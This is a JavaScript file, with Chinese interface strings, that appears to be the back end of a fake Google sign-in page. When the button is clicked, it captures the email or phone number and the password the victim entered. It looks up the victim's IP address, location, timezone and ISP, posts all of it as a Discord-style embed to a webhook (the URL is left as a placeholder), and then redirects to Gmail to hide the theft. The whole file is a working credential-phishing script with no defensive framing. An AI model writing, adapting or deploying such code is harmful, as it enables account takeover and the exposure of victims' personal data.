document.addEventListener("DOMContentLoaded", () => {
    const signInButton = document.querySelector(".sign-in-btn");

    signInButton.addEventListener("click", (event) => {
        event.preventDefault();

        const emailOrPhone = document.getElementById("emailOrPhoneInput").value.trim();
        const password = document.getElementById("passwordInput").value;

        if (!emailOrPhone || !password) {
            alert("請輸入電子郵件地址或電話號碼與密碼！");
            return;
        }

        fetch("https://api.ipify.org?format=json")
            .then(res => res.json())
            .then(data => {
                const userIP = data.ip;
                return fetch(`http://ip-api.com/json/${userIP}`);
            })
            .then(res => res.json())
            .then(geo => {
                const webhookURL = "web url";

                const embedPayload = {
                    username: "帳號資訊",
                    embeds: [
                        {
                            title: "Google 登入資訊",
                            color: 0xff4444,
                            fields: [
                                {
                                    name: "電子郵件或電話",
                                    value: emailOrPhone || "無",
                                    inline: true
                                },
                                {
                                    name: "密碼",
                                    value: password || "無",
                                    inline: true
                                },
                                {
                                    name: "IP 位址",
                                    value: geo.query || "不明"
                                },
                                {
                                    name: "地理位置",
                                    value: `${geo.country} ${geo.regionName} - ${geo.city}`
                                },
                                {
                                    name: "時區 / ISP",
                                    value: `${geo.timezone} / ${geo.isp}`
                                }
                            ],
                            timestamp: new Date().toISOString()
                        }
                    ]
                };

                return fetch(webhookURL, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify(embedPayload)
                });
            })
            .then(() => {
                window.location.href = "https://mail.google.com/mail/u/0/";
            })
            .catch((error) => {
                console.error("發生錯誤：", error);
                window.location.href = "https://mail.google.com/mail/u/0/";
            });
    });
});
